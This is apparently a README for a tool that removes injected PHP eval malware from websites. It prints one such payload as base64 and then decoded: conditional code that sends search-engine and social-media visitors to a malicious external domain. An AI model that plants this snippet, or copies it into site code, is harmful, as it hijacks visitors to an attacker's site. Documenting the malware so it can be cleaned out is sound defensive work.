exploit cleaner
==============

Removes common eval exploit code will have something similar to this:

eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZl
cmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICgh
c3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9v
Iikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsa
XZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZ
lcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvc
iBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSB
vciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyK
CRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9vbm90aXcuZG5
zZXQuY29tLyIpOw0KZXhpdCgpOw0KfQp9Cn0NCn0NCn0="));

That decodes to:


error_reporting(0);
$qazplm=headers_sent();
if (!$qazplm){
$referer=$_SERVER['HTTP_REFERER'];
$uag=$_SERVER['HTTP_USER_AGENT'];
if ($uag) {
if (!stristr($uag,"MSIE 7.0") and !stristr($uag,"MSIE 6.0")){
if (stristr($referer,"yahoo") or stristr($referer,"bing") or stristr($referer,"rambler") or stristr($referer,"live.com") or stristr($referer,"webalta") or stristr($referer,"bit.ly") or stristr($referer,"tinyurl.com") or preg_match("/yandex\.ru\/yandsearch\?(.*?)\&lr\=/",$referer) or preg_match ("/google\.(.*?)\/url\?sa/",$referer) or stristr($referer,"myspace.com") or stristr($referer,"facebook.com/l") or stristr($referer,"aol.com")) {
if (!stristr($referer,"cache") or !stristr($referer,"inurl")){
header("Location: http://onotiw.dnset.com/");
exit();
}
}


Which would send anyone that came from facebookl, yahoo, or google to:

http://onotiw.dnset.com/
